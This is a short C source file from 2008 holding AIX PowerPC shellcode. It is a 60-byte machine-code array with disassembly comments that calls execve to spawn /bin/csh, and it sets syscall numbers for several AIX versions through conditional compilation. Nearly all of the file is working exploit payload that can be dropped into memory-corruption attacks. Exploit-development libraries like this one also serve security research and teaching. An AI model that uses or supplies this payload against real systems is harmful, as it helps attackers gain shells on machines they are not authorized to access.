/*
 *  $Id: aix-power-shellcode.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  aix-power-shellcode.c - AIX Power shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Currently supported AIX levels.
 * -DV410   AIX 4.1.0
 * -DV420   AIX 4.2.0
 * -DV430   AIX 4.3.0
 * -DV433   AIX 4.3.3
 * -DV530   AIX 5.3.0
 *
 */

char shellcode[]=           /*  60 bytes                          */
    "\x3b\xe0\x01\xff"      /*  lil     r31,511                   */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xf9"      /*  bnel    <shellcode>               */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
    "\x38\x7e\xfe\x29"      /*  cal     r3,-471(r30)              */
    "\x98\xbe\xfe\x31"      /*  stb     r5,-463(r30)              */
    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
    "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
#if defined(V410) || defined(V433)
    "\x38\x5f\xfe\x04"      /*  cal     r2,-508(r31)              */
#endif
#ifdef V420
    "\x38\x5f\xfe\x03"      /*  cal     r2,-509(r31)              */
#endif
#ifdef V430
    "\x38\x5f\xfe\x05"      /*  cal     r2,-507(r31)              */
#endif
#ifdef V530
    "\x38\x42\xfe\x06"      /*  cal     r2,-506(r2)               */
#endif
    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
    "/bin/csh"
;

